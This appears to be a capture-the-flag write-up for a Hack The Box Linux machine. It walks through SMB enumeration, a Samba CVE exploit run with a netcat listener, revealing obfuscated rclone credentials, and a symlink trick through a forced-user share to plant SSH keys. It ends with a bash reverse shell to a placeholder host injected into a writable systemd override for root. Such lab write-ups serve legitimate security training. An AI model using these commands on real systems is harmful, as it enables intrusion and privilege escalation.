# HTB – Abducted | Linux | Medium

## Recon

```bash
nmap -sV -sC -p- --min-rate 5000 <target-ip>
```

**Revealed Ports:**
```
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

No 80, 443 — that's very interesting.
Let's do UDP just in case:

**UDP:**
```
68/udp  open|filtered dhcpc
137/udp open  netbios-ns
138/udp open|filtered netbios-dgm
```

Nothing interesting here.

---

## SMB Enumeration

```bash
nxc smb <target-ip>
```

Gave: `HP-Reception` WRITE — Reception printer looks interesting/sus.
While searching about this share I came across **CVE-2026-4480** — it is running Samba 4 and I'm not sure about the exact version, I ran the exploit anyway.

---

## Initial Access — CVE-2026-4480

```bash
python3 exploit.py <target-ip> <your-ip> 4444
```

```bash
nc -lvnp 4444
```

Got a shell back from `nobody` — that was lucky.

---

## Lateral Movement — Nobody → Scott

After enumeration of network, files, running processes and services came across:

```
/opt/offsite-backup/rclone.conf
/opt/offsite-backup/sync.sh
```

The config file revealed creds of the rclone, password was obfuscated:

```bash
rclone reveal <hash>
# iX********* [REDACTED]
```

Access Scott with the found creds:

```bash
cat user.txt
```

---

## Lateral Movement — Scott → Marcus

1st thing I checked is `/srv/projects/` — `readme.txt` says: `Hartley Group - internal project store`, hm...

After a decent amount of enumeration came across `smb.conf` — it has definition file set to `shares.conf` (`include = shares.conf`) which is the file where all the particular share config are found, this is how it looks:

```ini
[HP-Reception]
comment = Reception printer
path = /var/spool/samba
printable = yes
guest ok = yes
print command = /usr/local/bin/printaudit %J %s
lpq command = /bin/true
lprm command = /bin/true

[projects]
comment = Hartley Group Project Files
path = /srv/projects
valid users = scott
read only = no
browseable = yes

[transfer]
comment = Staff file transfer
path = /srv/transfer
valid users = scott
force user = marcus
read only = no
wide links = yes
browseable = yes
```

The transfer share has the force user set to Marcus so any file operation through `[transfer]` runs as Marcus.... and this is where the transfer share comes into picture.

```bash
ln -s /home/marcus /srv/transfer/marcus_home
```

Now I will be able to access `/transfer/marcus_home` which is now the Marcus home dir.

```bash
smbclient //localhost/transfer -U scott
```

Made a key locally and put it into `/marcus_home/.ssh/` which also gets pasted into the actual path of the Marcus user:

```bash
put id_rsa.pub marcus_home/.ssh/authorized_keys
```

```bash
ssh -i id_rsa marcus@<target-ip>
```

---

## Privilege Escalation — Marcus → Root

1st thing noticed — Marcus is member of `operator`, checked what the user and member of operator can access:

```
/etc/systemd/system/smbd.service.d/override.conf  ← write access
```

This is the configuration file of the smbd and we have write access to it so all we gotta do is add a reverse shell:

```bash
cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
EOF
```

Reload the service so it loads the config file:

```bash
systemctl daemon-reload
systemctl restart smbd
```

```bash
nc -lvnp 4444
```

```
Root shell → cat /root/root.txt
```

---

ROOTED...

Rate: 4.8/5 ... a very solid machine 🔥
